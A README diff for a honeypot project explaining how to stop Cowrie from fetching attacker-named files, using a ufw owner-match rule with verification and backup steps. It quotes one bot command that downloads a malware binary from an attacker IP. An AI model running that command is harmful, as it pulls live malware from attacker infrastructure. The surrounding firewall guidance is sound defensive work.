@@ -352,6 +352,115 @@ to be opened in **both** layers. Cowrie on 22 and 23, Conpot on 502 — a rule
 at Azure *and* a `ufw allow`. Forgetting the second is the most likely reason
 that a decoy would look dead when it is running fine. Check here first
 
+## Stopping the decoys reaching out
+
+The build as originally documented produced a sensor that made outbound
+connections to attacker-controlled hosts. Anyone following these steps would
+reproduce that, so the fix belongs here rather than only in the incident note.
+
+### Why
+
+Cowrie's `wget`, `curl` and `tftp` are not simulations. When a bot types
+`wget http://45.32.215.222/iran.mips`, Cowrie fetches that file for real and
+stores it under its SHA-256 in `var/lib/cowrie/downloads/`. That is how
+honeypots collect malware samples and it is on by default. Between 25 and
+29 September 2026 it produced 259 successful downloads and 72 failures — 331
+outbound connections — and 104 samples totalling 74 MB. Full account in
+`docs/rules-of-engagement.md` under *The outbound download problem*.
+
+### Why not in `cowrie.cfg`
+
+There is no configuration switch that disables it. The nearest-looking option is
+a trap: `download_limit_size = 0` means **no limit**, not no downloads. Even a
+size limit would not help, because the connection is opened before the size is
+known.
+
+A configuration setting is also the wrong layer for a rule the project states as
+absolute. It covers the commands somebody thought of, survives only until a
+Cowrie upgrade reintroduces the behaviour, and is trusted rather than verified.
+A packet filter covers every command, including ones not yet written.
+
+### The rule
+
+In `/etc/ufw/before.rules`, immediately after the existing
+`-A ufw-before-output -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT`:
+
+```
+# Deception Grid: the decoys must never initiate an outbound connection.
+# Cowrie emulates wget, curl and tftp by actually fetching the file an
+# attacker names, which means connecting to attacker-controlled hosts.
+# 259 such downloads happened between 25 and 29 September 2026 before it
+# was noticed. Replies to attackers are ESTABLISHED and accepted by the
+# rule above; only connections the cowrie user starts are rejected.
+# uid 1001 = cowrie.
+-A ufw-before-output -m owner --uid-owner 1001 -j REJECT --reject-with icmp-port-unreachable
+```
+
+Then `sudo ufw reload`.
+
+**Placement is the whole thing.** The rule must sit *below* ufw's existing
+accepts for loopback and for `RELATED,ESTABLISHED`. Above them, the same line
+stops Cowrie replying to attackers at all and the honeypot silently stops
+answering the door — a failure that looks like no traffic rather than like a
+broken firewall, which is the worst kind.
+
+`1001` is the `cowrie` user's uid on this machine. Check yours with
+`id -u cowrie` rather than copying the number.
+
+### Verify it, both ways
+
+One test is not enough here: it has to block outbound *and* leave inbound
+working.
+
+```
+# should fail -- exit code 7, no HTTP code
+sudo -u cowrie curl -s -o /dev/null -w 'http_code=%{http_code}\n' http://example.com
+
+# should print an SSH banner -- the honeypot still answering
+timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/22; head -c 40 <&3' | tr -d '\r'
+
+# should print: active
+sudo systemctl is-active cowrie
+
+# the rule should be third in the chain, after lo and after ESTABLISHED
+sudo iptables -L ufw-before-output -n -v --line-numbers
+```
+
+Recorded result on 29 September 2026: `http_code=000`, curl exit 7,
+`SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3`, service active, rule at position 3.
+
+### Check the rule syntax before reloading a live firewall
+
+Reloading ufw while connected over SSH is worth doing carefully. The `owner`
+match needs a kernel module, and if it is missing the reload fails rather than
+the rule. Prove the kernel accepts the rule first, in a chain nothing uses:
+
+```
+sudo iptables -N dgtest
+sudo iptables -A dgtest -m owner --uid-owner 1001 -j REJECT --reject-with icmp-port-unreachable \
+  && echo 'RULE SYNTAX OK'
+sudo iptables -F dgtest
+sudo iptables -X dgtest
+```
+
+### What still gets captured
+
+Cowrie logs `cowrie.session.file_download.failed` with the URL it was told to
+fetch, so the infrastructure serving the payloads is still recorded. Only the
+binaries stop arriving. Files pushed *to* the sensor over SCP were never
+affected — that is inbound, and it is what the project is for.
+
+### Keep the backup of the original
+
+```
+sudo cp -n /etc/ufw/before.rules /etc/ufw/before.rules.orig
+```
+
+Taken before the edit on 29 September 2026. `before.rules` is a distribution
+file and a package upgrade may replace it, which would silently remove this
+rule. **Re-check it after any `ufw` or kernel upgrade**, with the
+`iptables -L ufw-before-output` command above.
+
 ## What is excluded from this repo
 
 - **The machine's public address, and my own admin address.** A honeypot with
